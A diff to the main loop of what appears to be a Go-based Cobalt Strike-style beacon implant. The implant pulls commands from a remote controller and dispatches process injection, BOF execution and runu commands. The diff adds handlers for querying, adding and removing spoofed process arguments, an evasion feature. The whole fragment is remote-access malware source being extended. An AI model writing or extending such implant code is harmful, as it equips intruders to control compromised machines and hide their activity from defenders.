@@ -57,6 +57,7 @@ func main() {
 
 	var Token uintptr
 	var powershellImport []byte
+	var argues = make(map[string]string)
 	for {
 		data, err := communication.PullCommand()
 		if data != nil && err == nil {
@@ -226,10 +227,19 @@ func main() {
 							result, err = services.CmdInjectX86(cmdBuf)
 							callbackType = 0
 						case packet.CMD_TYPE_BOF:
-							result, err = services.CMDBof(cmdBuf)
+							result, err = services.CmdBof(cmdBuf)
 							callbackType = 0
 						case packet.CMD_TYPE_RUNU:
 							result, err = services.CmdRunu(cmdBuf)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_QUERY:
+							result, err = services.CmdArgueQuery(argues)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_REMOVE:
+							result, err = services.CmdArgueRemove(argues, cmdBuf)
+							callbackType = 0
+						case packet.CMD_TYPE_ARGUE_ADD:
+							result, err = services.CmdArgueAdd(argues, cmdBuf)
 							callbackType = 0
 						default:
 							err = errors.New("This type is not supported now.")
